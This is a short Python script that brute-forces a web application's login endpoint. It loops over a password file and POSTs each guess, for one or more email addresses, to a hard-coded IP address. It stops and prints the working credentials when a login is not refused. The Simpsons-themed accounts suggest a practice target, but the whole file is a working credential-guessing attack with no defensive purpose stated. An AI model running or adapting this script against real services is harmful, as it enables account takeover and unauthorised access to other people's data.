import json
import sys

import requests

with open("./passwords") as f:
    passwords = f.readlines()
passwords = [x.strip() for x in passwords]

#emails = ["Apu@kwike.mart", "admin@kwike.mart", "Apu@kwik-e.mart", "admin@kwik-e.mart", "apu@kwik-e.mart",          "apu@kwike.mart"]
emails = ["Maggie.Simpson@simpsonmail.com"]
failed = 0

for password in passwords:
    for email in emails:
        data = {"email": email, "password": password, }
        data_json = json.dumps(data)
        headers = {'Content-type': 'application/json'}

        r = requests.post('http://43.241.202.33:3003/rest/user/login',
                          data=data_json,
                          headers=headers,
                          )

        if r.status_code != 401:
            print(failed)
            print(r)
            print(email)
            print(password)
            sys.exit()
        else:
            failed = failed + 1
            if failed % 100 == 0:
                print(failed)
